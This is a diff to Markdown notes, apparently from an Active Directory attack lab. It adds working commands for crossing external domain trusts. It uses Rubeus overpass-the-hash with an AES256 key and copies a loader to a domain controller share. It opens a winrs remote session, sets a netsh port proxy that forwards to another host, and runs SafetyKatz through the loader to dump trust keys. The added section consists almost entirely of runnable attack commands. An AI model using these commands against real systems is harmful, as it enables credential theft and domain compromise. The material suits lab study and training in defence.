@@ -25,8 +25,19 @@ C:\Users\Public\Loader.exe -path C:\Users\Public\SafetyKatz.exe "lsadump::evasiv
 
 > **Note:** Can only access resources that were explicitly shared with you
 
-Across external trusts
+Across external trusts - OPtH and obtain trust key
 ```powershell
 C:\Users\Public\Loader.exe -path C:\Users\Public\Rubeus.exe -args asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
 ```
+
+```powershell
+echo F | xcopy C:\Users\Public\Loader.exe \\dcorp-dc\C$\Users\Public\Loader.exe
+
+winrs -r:dcorp-dc 
+
+netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.48
+
+C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "lsadump::evasive-trust /patch" "exit"
+```
+
 
